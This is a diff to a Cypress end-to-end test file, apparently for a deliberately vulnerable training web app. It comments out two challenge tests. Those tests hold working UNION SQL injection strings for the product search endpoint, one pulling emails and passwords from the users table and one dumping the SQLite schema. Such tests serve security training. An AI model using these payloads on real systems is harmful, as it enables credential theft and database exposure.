@@ -31,23 +31,23 @@ describe('/#/search', () => {
 })
 
 describe('/rest/products/search', () => {
-  describe('challenge "unionSqlInjection"', () => {
+  /* describe('challenge "unionSqlInjection"', () => {
     it('query param in product search endpoint should be susceptible to UNION SQL injection attacks', () => {
       cy.request(
         "/rest/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9' from users--"
       )
       cy.expectChallengeSolved({ challenge: 'User Credentials' })
     })
-  })
+  }) */
 
-  describe('challenge "dbSchema"', () => {
+  /* describe('challenge "dbSchema"', () => {
     it('query param in product search endpoint should be susceptible to UNION SQL injection attacks', () => {
       cy.request(
         "/rest/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9' from sqlite_master--"
       )
       cy.expectChallengeSolved({ challenge: 'Database Schema' })
     })
-  })
+  }) */
 
   describe('challenge "dlpPastebinLeakChallenge"', () => {
     beforeEach(() => {
